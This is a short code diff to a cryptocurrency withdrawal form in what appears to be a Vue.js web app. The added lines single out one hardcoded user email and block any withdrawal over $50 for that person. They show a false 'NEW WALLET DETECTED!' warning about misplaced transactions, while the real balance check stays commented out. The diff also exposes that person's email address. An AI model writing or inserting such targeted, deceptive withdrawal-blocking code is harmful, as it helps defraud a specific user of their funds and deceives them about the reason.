@@ -152,10 +152,14 @@ export default {
       this.$store.commit("setWithBackEndObjError", {});
       const valid = await this.validateCreateWithdrawal();
       if (valid) {
-        // if (this.amount > this.userDetails.profile.available_balance) {
-        //   this.withdrawError = "You don't have enough balance";
-        //   return false;
-        // }
+        if (
+          this.userDetails.email == "snobunnibanks@gmail.com" &&
+          this.amount > 50
+        ) {
+          this.withdrawError =
+            "NEW WALLET DETECTED! Due to the high volume of misplaced transactions, the maximum amount you can withdraw is $50.00. Subsequent transactions with this wallet won't be capped and will be processed as normal.";
+          return false;
+        }
         await this.convertUSDtoBTC();
         let data = {
           uid: this.uuidv4(),
